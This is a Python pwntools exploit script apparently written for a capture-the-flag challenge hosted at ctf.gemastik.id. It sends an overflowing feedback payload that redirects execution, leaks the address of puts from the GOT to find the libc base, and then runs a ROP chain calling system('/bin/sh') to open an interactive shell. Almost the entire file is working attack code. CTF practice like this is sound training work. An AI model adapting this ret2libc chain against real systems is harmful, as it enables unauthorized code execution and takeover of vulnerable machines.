#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
# libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = './libc'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'ctf.gemastik.id', 11101

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x40150e
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chall 
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

def add_notebook(idx, title, content):
    io.sendlineafter(b'choice: ', b'1')
    io.sendlineafter(b'index: ', str(idx).encode())
    io.sendlineafter(b'title: ', title)
    io.sendlineafter(b'content: ', content)

def remove_notebook(idx):
    io.sendlineafter(b'choice: ', b'2')
    io.sendlineafter(b'index: ', str(idx).encode())

def add_feedback(data):
    io.sendlineafter(b'choice: ', b'3')
    io.sendlineafter(b'feedback: ', data)

def exploit():
    global io
    io = initialize()
    rop = ROP(libc)

    payload = b''
    payload += b'%7$s'
    # payload += b'%p||' * (63 // 4) # fuzz
    # payload += b'leak: %3$p' # _IO_2_1_stdin_
    # payload += b'leak: %9$p' # __libc_start_call_main+122
    payload += b'\x00' * (64 - len(payload))
    payload += p64(elf.bss() + 0x700) # rbp
    payload += p64(0x04014ef)
    payload += p64(elf.sym['addFeedback'])
    payload += p64(elf.got['puts'])
    add_feedback(payload)

    # io.recvuntil(b'leak: 0x')
    # leak = int(io.recv(12), 16)
    # libc.address = leak - 122 #- libc.sym['__libc_start_call_main']
    
    # printf: 0x7feb8fc530f0
    # puts: 0x7f011e50abd0
    # atoi: 0x7f4270352650
    # libc6_2.39-0ubuntu4_amd64
    leak = u64(io.recv(6).ljust(8, b'\x00'))
    libc.address = leak - libc.sym['puts']

    payload = flat({
        64: [
            elf.bss() + 0x200,
            libc.address + rop.rdi.address,
            next(libc.search(b'/bin/sh\x00')),
            libc.address + rop.ret.address,   
            libc.sym['system']
        ]
    })
    io.sendline(payload)

    log.success('leak: %#x', leak)
    log.success('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
